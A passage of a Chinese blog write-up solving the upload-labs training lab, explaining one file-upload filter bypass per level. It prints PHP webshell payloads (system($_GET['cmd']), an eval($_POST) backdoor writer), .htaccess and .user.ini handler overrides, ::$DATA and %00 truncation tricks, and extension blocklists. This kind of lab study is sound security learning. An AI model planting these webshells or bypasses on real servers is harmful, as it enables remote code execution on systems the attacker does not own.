class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>))&#123; ..... &#125;</span><br></pre></td></tr></table></figure><h3 id="上传属性判断"><a href="#上传属性判断" class="headerlink" title="上传属性判断"></a>上传属性判断</h3><h4 id="关卡1"><a href="#关卡1" class="headerlink" title="关卡1"></a>关卡1</h4><p>方案一：直接禁用js，然后刷新页面即可上传</p><p>方案二：burpsuite抓包修改后缀</p><p>方案三：修改js代码，我修改后js后并没有按照我修改的代码执行，不知道怎么回事</p><p>方案四：用F12打断点调试，修改js的变量</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027110151189.png" alt="image-20201027110151189"></p><p>使用在Console中修改 <code>allow_ext</code> 的变量，即可上传</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027110247950.png" alt="image-20201027110247950"></p><h4 id="关卡二"><a href="#关卡二" class="headerlink" title="关卡二"></a>关卡二</h4><p>后端使用<code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code> 获取文件类型判断，从而决定是否被上传。</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027113432599.png" alt="image-20201027113432599"></p><p>使用burp suite拦截，修改 <code>content-type</code></p><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h4 id="关卡三"><a href="#关卡三" class="headerlink" title="关卡三"></a>关卡三</h4><p>环境条件：</p><ul><li>老版本phpstudy也就是apache版本为2.4.23</li><li>php &lt;= 5.5.38</li><li>去掉注释：<code> AddType application/x-httpd-php .php .phtml</code> 表示想把<code>.phtml</code>的文件按照php解析</li></ul><p>看提示是黑名单过滤</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027113715301.png" alt="image-20201027113715301"></p><p>那就用别名搞，像php3、phtml、php4等。</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027125150328.png" alt="image-20201027125150328"></p><h4 id="关卡四"><a href="#关卡四" class="headerlink" title="关卡四"></a>关卡四</h4><p><strong>利用条件</strong></p><ul><li><p>5.6以下且不带nts的php版本</p></li><li><p>修改apache配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &#x2F;&gt;</span><br><span class="line">    Options +Indexes +FollowSymLinks +ExecCGI   # 默认开启</span><br><span class="line">    AllowOverride All   # 默认为None</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure><p>看提示，拦截的更多了。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</span><br></pre></td></tr></table></figure><p>上传<code>.htaccess</code>文件，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方式一：表示全都按照php解析</span><br><span class="line">SetHandler application&#x2F;x-httpd-php </span><br><span class="line"></span><br><span class="line">方式二：只是png的后缀会按照php解析</span><br><span class="line">&lt;FilesMatch &quot;\.png$&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><h4 id="关卡五"><a href="#关卡五" class="headerlink" title="关卡五"></a>关卡五</h4><h5 id="姿势一-解析漏洞"><a href="#姿势一-解析漏洞" class="headerlink" title="姿势一: 解析漏洞"></a>姿势一: 解析漏洞</h5><p>在Apache 2.0.x &lt;= 2.0.59，Apache 2.2.x &lt;= 2.2.17，Apache 2.2.2 &lt;= 2.2.8中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</p><p><strong>条件：</strong></p><ul><li>多后缀解析漏洞需要在httpd.conf中开启 <code>AddType application/x-httpd-php .php</code> </li><li>php版本 &lt; 5.5.38  非nts</li></ul><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027135514245.png" alt="image-20201027135514245"></p><p>多后缀解析特性：Apache 持一个文件拥有多个后缀，当不认识最后一个后缀就会向前继续识别后缀，如果先遇到png，就会当成图片处理，如果先遇到zip就会当成压缩包处理，同样如果先遇到php就会当成php解析。</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027135956956.png" alt="image-20201027135956956"></p><h5 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h5><p><strong><a href="https://www.cnblogs.com/sijidou/p/13121301.html">预备知识</a></strong></p><p>从<code>php5.3</code>开始，启动了<code>.user.ini</code>。现在大部分网站都是用的<code>fastcgi</code>，这个东西我理解的是可以提供web服务器的一种<code>api</code>，而<code>apache</code>/<code>nginx</code>/<code>iis</code>这些服务器都会依靠这种<code>api</code>来运行。而在服务器以<code>fastcgi</code>启动运行的时候，<code>.user.ini</code>也是<code>php</code>的一种配置文件，众所周知<code>php.ini</code>是<code>php</code>的配置文件，它可以做到显示报错，导入扩展，文件解析，web站点路径等等设置。但是如果想要把某个文件里面的配置与全局的<code>php.ini</code>不同，则可以在<code>php文件</code>中加上<code>ini_set()</code>来配置特定的配置变量。</p><p>而<code>.user.ini</code>和<code>.htaccess</code>一样是对当前目录的所以<code>php</code>文件的配置设置，即写了<code>.user.ini</code>和它同目录的文件会优先使用<code>.user.ini</code>中设置的配置属性。</p><p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的<code>php.ini</code>，我们可以自定义除了<code>PHP_INI_SYSTEM</code>以外的模式，<u>在执行php代码之前，系统会对<code>.user.ini</code>先做一个执行，然后才执行其他的php文件。</u>有以下两种方式：</p><ol><li>auto_prepend_file表示在加载第一个php代码之前预加载改配置文件所指示的PHP文件</li><li>auto_append_file表示在加载第一个php代码之后执行预加载该配置所指示的PHP文件</li></ol><p><strong>利用条件：</strong></p><ul><li>需要php带nts。</li><li>上传的 <code>.user.ini</code> 和 图片一句话木马 同一个目录中还需要有个可执行的php代码</li></ul><p>上传一个 <code>.user.ini</code> 内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.gif</span><br><span class="line"># 或者 </span><br><span class="line">auto_append_file&#x3D;1.gif</span><br></pre></td></tr></table></figure><p>然后上传<code>1.gif</code>的图片木马:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span><br></pre></td></tr></table></figure><p>然后访问：<code>http://192.168.124.23/upload/readme.php?cmd=ipconfig</code></p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027152107982.png" alt="image-20201027152107982"></p><p>实际上就是当<code>.user.ini、1.gif、readme.php</code>在同一个文件夹下时，访问readme.php之前，会先加载<code>.user.ini</code>配置文件，而配置文件里面的内容相当于文件包含，包含了<code>1.gif</code></p><p><code>.user.ini</code>比<code>.htaccess</code>使用更加广泛</p><h4 id="关卡6"><a href="#关卡6" class="headerlink" title="关卡6"></a>关卡6</h4><h5 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h5><p>看到源代码没了 <code>tolower函数</code>，那就是可以大小写绕过咯？</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027153852102.png" alt="image-20201027153852102"></p><p>过滤几个大写<code>pHp</code>，没有过滤完所有的大小写组合的可能后缀名，换个大写绕过<code>PhP</code>绕过</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027154201867.png" alt="image-20201027154201867"></p><p><strong>一直踏的坑</strong>：nts版本php，大小写绕不过去？反正就是服务器内部故障</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027154329217.png" alt="image-20201027154329217"></p><h5 id="姿势二-1"><a href="#姿势二-1" class="headerlink" title="姿势二"></a>姿势二</h5><p><strong>只是针对Windows系统的服务器</strong></p><p>看到有一处<code>str_replace</code>函数，还是替换的为空，那不就双重名字直接怼他，来个<code>::::$DATA$DATA</code>，首先php替换成<code>::$DATA</code>，在内存中为<code>tmpName.php::$DATA</code>。在window中的时候如果  文件名+<code>&quot;::$DATA&quot;</code>  会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名。</p><p><strong>扩展</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">需要上传的文件内容为：&lt;?php phpinfo();?&gt;下面是上传是会出现的现象：</span><br><span class="line">上传的文件名 服务器表面现象  生成的文件内容</span><br><span class="line">Test.php:a.jpg   生成Test.php 空</span><br><span class="line">Test.php::$DATA 生成test.php &lt;?php phpinfo();?&gt;</span><br><span class="line">Test.php::$INDEX_ALLOCATION 生成test.php文件夹 </span><br><span class="line">Test.php::$DATA\0.jpg 生成0.jpg &lt;?php phpinfo();?&gt;</span><br><span class="line">Test.php::$DATA\aaa.jpg 生成aaa.jpg &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://www.cnblogs.com/swyft/p/5490872.html">https://www.cnblogs.com/swyft/p/5490872.html</a></li></ul><h4 id="关卡七"><a href="#关卡七" class="headerlink" title="关卡七"></a>关卡七</h4><h5 id="姿势一-1"><a href="#姿势一-1" class="headerlink" title="姿势一"></a>姿势一</h5><p>利用条件：</p><ul><li>php &lt;= 7.0.12</li></ul><p>空格绕过，没说的。没遇上问题</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027154652592.png" alt="image-20201027154652592"></p><p>代码比较</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Lesson6中源代码如下:</span><br><span class="line">$file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);   # 过滤了两边的空格</span><br><span class="line"># Lesson7中源代码如下：</span><br><span class="line">  $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];   # 没有过滤两边的空格 </span><br></pre></td></tr></table></figure><p>我以为空格有什么有什么特别的绕过姿势，然后断点调试了下，发现也就只是把空格当成文件名的一部分处理了，</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201027171736795.png" alt="image-20201027171736795"></p><h5 id="姿势二-2"><a href="#姿势二-2" class="headerlink" title="姿势二"></a>姿势二</h5><p>和关卡6姿势二一样</p><h4 id="关卡八"><a href="#关卡八" class="headerlink" title="关卡八"></a>关卡八</h4><h5 id="姿势一：末尾加-绕过。"><a href="#姿势一：末尾加-绕过。" class="headerlink" title="姿势一：末尾加.绕过。"></a><strong>姿势一：末尾加<code>.</code>绕过。</strong></h5><p>Windows创建文件时，如<code>eval.php............</code> 只会识别成<code>eval.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201028091147369.png" alt="image-20201028091147369"></p><h5 id="姿势二："><a href="#姿势二：" class="headerlink" title="姿势二："></a><strong>姿势二：</strong></h5><p>使用双重<code>::$DATA</code>绕过</p><h4 id="关卡九"><a href="#关卡九" class="headerlink" title="关卡九"></a>关卡九</h4><p>使用一个<code>::$DATA</code>直接绕过</p><h4 id="关卡十"><a href="#关卡十" class="headerlink" title="关卡十"></a>关卡十</h4><p>看下关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,.....,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;    <span class="comment">// 这里的 $file_name</span></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的代码都是在获取第一个点之后，把后面所有内容当成后缀，然后处理后缀，用时间作为文件名，处理后的后缀作为后缀名。但是现在变成了先处理后缀，然后直接filename直接作为文件名。</p><p>使用<code>. .</code>作为后缀绕过。</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201028124743651.png" alt="image-20201028124743651"></p><p>末尾虽然有个<code>.</code>，但是Windows系统会忽略。Linux上应该不会被忽略。</p><h4 id="关卡十一"><a href="#关卡十一" class="headerlink" title="关卡十一"></a>关卡十一</h4><p>源码如下，就是将文件名后缀在黑名单中的后缀进行替换 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>); <span class="comment">// 按照列表中的前后顺序，在文件名中查找并替换</span></span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201028130948272.png" alt="image-20201028130948272"></p><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h4 id="关卡十二"><a href="#关卡十二" class="headerlink" title="关卡十二"></a>关卡十二</h4><p>%00截断，但是感觉局限大。没想到其他方案</p><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123; ... &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 上传路径可以由GET控制，然后拼接文件名后缀。</span></span><br></pre></td></tr></table></figure><p>条件：</p><ul><li>只是在php为5.2.17成功</li><li>php.ini中的magic_quotes_gpc是off状态的。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029132842.png" alt="image-20201029090159640"></p><p>也就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(<span class="variable">$temp_file</span>, <span class="string">&quot;../upload/123.php%00/tmp_name.png&quot;</span>) <span class="comment">// %00 后的内容被溶断</span></span><br></pre></td></tr></table></figure><h4 id="关卡十三"><a href="#关卡十三" class="headerlink" title="关卡十三"></a>关卡十三</h4><p>还是和上面一样，文件路径可以控制，不过由GET方式编程POST方式。在GET里面使用<code>%00</code>可以熔断。在POST可以通过修改十六进制来熔断。</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029132851.png" alt="image-20201029124450922"></p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029132858.png" alt="image-20201029093955866"></p><h3 id="图片木马-文件包含"><a href="#图片木马-文件包含" class="headerlink" title="图片木马+文件包含"></a>图片木马+文件包含</h3><h4 id="关卡十四"><a href="#关卡十四" class="headerlink" title="关卡十四"></a>关卡十四</h4><p>看了半天，实在想不出来怎么绕过的，因为虽然是外部传入，但是都是被程序控制住了。原来是upload-labs靶场提供了一个文件包含的测试页面，在根目录下include.php。那就简单了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line"><span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line"><span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;   </span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line"><span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line"><span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">  <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">  <span class="keyword">break</span>;        </span><br><span class="line">  <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:            </span><br><span class="line">  <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>通过前两个字节判断文件类型。然后拼接到文件名后面。上传图片马，然后文件包含就行了。</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029135515.png" alt="image-20201029135515226"></p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029140041.png" alt="image-20201029140041474"></p><h4 id="关卡十五"><a href="#关卡十五" class="headerlink" title="关卡十五"></a>关卡十五</h4><p>还是图片木马上传，这里的检测姿势就是，通过内置函数获取上传文件的属性</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029141747.png" alt="image-20201029141740586"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">  <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>); </span><br><span class="line">  <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);   <span class="comment">// info[2]就是文件类型</span></span><br><span class="line">  <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="关卡十六"><a href="#关卡十六" class="headerlink" title="关卡十六"></a>关卡十六</h4><p>使用下面代码判断上传文件类型，基本上绕过就算凉了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$image_type &#x3D; exif_imagetype($filename);</span><br></pre></td></tr></table></figure><p>那只有类似于上面的文件包含了。</p><h3 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h3><h4 id="关卡十七"><a href="#关卡十七" class="headerlink" title="关卡十七"></a>关卡十七</h4><p>这个用了图片的二次渲染，之前制作图片木马都是直接将代码加载图片最后面， 但是这里上传之后会将图片重新生成，就可能导致我们后门不能使用。但是二次渲染有部分位置是不会变化的，所以将我的代码写入这个不变的地方即可。</p><p>然后尝试着上传一个gif，使用文件包含看看能不能看出不同。</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/imagesimage-20201107125711752.png" alt="image-20201107125711752"></p><p>看其他的都是通过十六进制对比上传的图片和本地图片那些地方没有改变，从而写入木马。身为小白的我，用winhex没有尝试成功。 然后尝试直接包含，发现这一处没咋变化。 </p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107131352.png" alt="image-20201107131351987"></p><p>然后尝试把这个地方换成<code>&lt;?php phpinfo() ?&gt;</code> 上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107131712.png" alt="image-20201107131712629"></p><h4 id="关卡十八"><a href="#关卡十八" class="headerlink" title="关卡十八"></a>关卡十八</h4><p>条件竞争上传，产生的原因是，代码先将我们上传的文件写入到服务器后，再判断文件是否合法。这样就产生一个空隙，可以用burpsuite使劲上传，一边用python脚本可劲的访问。</p><p>使用burpsuite不断上传包含内容如下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.php</span></span><br><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后使用python不断发包，访问上面的<code>test.php</code>。在机缘巧合之下，就能将文件上传的还没删除的时候，python发包访问了这个php文件，就能执行上面的代码，从而会新创建一个名为<code>shell.php</code>的后门文件。</p><h4 id="关卡十九"><a href="#关卡十九" class="headerlink" title="关卡十九"></a>关卡十九</h4><p>上传图片马+文件包含</p><p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107152713.png" alt="image-20201107152713812"></p><p>直接使用include访问即可。</p><h4 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h4><p>这一关感觉像是对上面的总结。</p><p>黑名单过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span 